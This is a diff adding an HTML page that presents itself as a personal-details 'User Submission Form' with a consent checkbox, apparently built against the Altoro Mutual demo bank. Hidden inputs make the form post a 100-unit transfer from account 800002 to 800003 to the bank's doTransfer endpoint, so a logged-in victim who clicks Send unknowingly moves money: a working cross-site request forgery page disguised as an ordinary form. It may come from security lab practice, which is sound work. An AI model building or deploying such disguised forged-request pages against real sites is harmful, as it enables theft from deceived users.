@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Extended Form</title>
+    <style>
+        /* Add styles for the background image */
+        body {
+            background-image: url('https://www.thestatesman.com/wp-content/uploads/2022/09/ncrb-1.jpg'); /* Replace with the path to your logo image */
+            background-repeat: no-repeat; /* Avoid repeating the image */
+            background-size: cover; /* Cover the entire page with the image */
+            background-color: lightblue; /* Light blue with 50% transparency */
+            font-family: Arial, sans-serif; /* Default font */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+            height: 100vh;
+            background-position: center; /* Center the image */
+        }
+
+        /* Add some styling to make the form readable on the background */
+        form {
+            background-color: rgba(255, 255, 255, 0.8); /* White background with some transparency */
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: auto;
+        }
+
+        h1, h2 {
+            text-align: center;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        input[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <h1>User Submission Form</h1>
+    <form method="POST" action="https://altoromutual.com:443/bank/doTransfer">
+        <input type="hidden" name="fromAccount" value="800002">
+        <input type="hidden" name="toAccount" value="800003">
+        <input type="hidden" name="transferAmount" value="100">
+        <input type="hidden" name="transfer" value="Transfer Money">
+        
+        <!-- Personal Details -->
+        <h2>Personal Details</h2>
+        <label for="name">Full Name:</label><br>
+        <input type="text" id="name" name="name" placeholder="Enter your full name" required><br><br>
+
+        <label for="mobile">Mobile Number:</label><br>
+        <input type="tel" id="mobile" name="mobile" placeholder="Enter your mobile number" required><br><br>
+
+        <label for="gender">Gender:</label><br>
+        <select id="gender" name="gender" required>
+            <option value="" disabled selected>Select Gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+            <option value="Other">Other</option>
+        </select><br><br>
+
+        <label for="address">Address:</label><br>
+        <textarea id="address" name="address" rows="4" cols="30" placeholder="Enter your address" required></textarea><br><br>
+
+        <label for="pincode">Pincode:</label><br>
+        <input type="text" id="pincode" name="pincode" placeholder="Enter your pincode" pattern="[0-9]{6}" required><br><br>
+
+        <label for="state">State:</label><br>
+        <input type="text" id="state" name="state" placeholder="Enter your state" required><br><br>
+
+        <label for="country">Country:</label><br>
+        <input type="text" id="country" name="country" placeholder="Enter your country" required><br><br>
+
+        <!-- User Consent -->
+        <label for="consent">
+            <input type="checkbox" id="consent" name="consent" required>
+            I hereby confirm and agree that, to the best of my knowledge, I have not engaged in any illegal activities or actions.
+        </label><br><br>
+
+        <!-- Submit Button -->
+        <input type="submit" value="Send">
+    </form>
+</body>
+</html>
